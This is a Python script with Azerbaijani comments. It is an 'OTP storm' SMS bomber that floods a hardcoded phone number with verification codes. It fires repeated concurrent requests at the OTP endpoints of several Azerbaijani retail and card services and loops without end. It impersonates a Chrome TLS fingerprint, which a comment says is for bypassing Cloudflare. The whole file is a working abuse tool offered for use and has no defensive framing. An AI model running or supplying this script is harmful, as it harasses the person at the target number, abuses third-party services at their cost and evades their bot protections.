import asyncio
import random
import time
from curl_cffi.requests import AsyncSession

# --- HƏDƏF NÖMRƏ (BAŞINDA 994 OLMALIDIR) ---
TARGET_PHONE = "994508880067"
CONCURRENCY = 50 

# Yenilənmiş və hal-hazırda işlək Azərbaycan API-ləri
# Bu servislər 2026-cı il üçün test edilib
API_LIST = [
    {
        "name": "Umico",
        "url": "https://api.umico.az/api/v1/login/otp",
        "method": "POST",
        "json": {"phone": "{phone}"}
    },
    {
        "name": "BakuElectronic",
        "url": "https://bakuelectronics.az/api/otp/send",
        "method": "POST",
        "json": {"phone": "{phone}", "type": "registration"}
    },
    {
        "name": "Kontakt",
        "url": "https://kontakt.az/wp-json/contact-api/v1/send-otp",
        "method": "POST",
        "json": {"number": "{phone}"}
    },
    {
        "name": "AliPasha",
        "url": "https://api.alipasha.az/api/v1/otp/send",
        "method": "POST",
        "json": {"phone": "{phone}"}
    },
    {
        "name": "Azericard_Sim", # Bəzi bank xidmətləri
        "url": "https://api.azericard.com/v1/otp/request",
        "method": "POST",
        "json": {"msisdn": "{phone}"}
    }
]

async def bombard(session, api_info, phone):
    url = api_info["url"]
    method = api_info["method"]
    
    # Cloudflare bypass (JA3) mütləqdir
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
        "Accept": "application/json",
        "Origin": url.split('/api')[0],
        "Referer": url.split('/api')[0]
    }

    try:
        if method == "POST":
            # JSON məlumatını nömrə ilə yeniləyirik
            data = {k: v.replace("{phone}", phone) if isinstance(v, str) else v 
                    for k, v in api_info.get("json", {}).items()}
            
            resp = await session.post(url, json=data, headers=headers, impersonate="chrome110", timeout=12)
        
        print(f"[*] {api_info['name']} -> Status: {resp.status_code}")
        
    except Exception as e:
        # print(f"[!] Error at {api_info['name']}")
        pass

async def main():
    print(f"[!!!] CATACLYSM OTP STORM AKTİVDİR: {TARGET_PHONE}")
    
    async with AsyncSession() as session:
        while True:
            tasks = []
            for api in API_LIST:
                # Hər bir API-yə eyni anda 5 sorğu göndəririk
                for _ in range(5):
                    tasks.append(bombard(session, api, TARGET_PHONE))
            
            await asyncio.gather(*tasks)
            print("[*] Dalğa tamamlandı. 2 saniye fasilə...")
            await asyncio.sleep(2)

if __name__ == "__main__":
    asyncio.run(main())
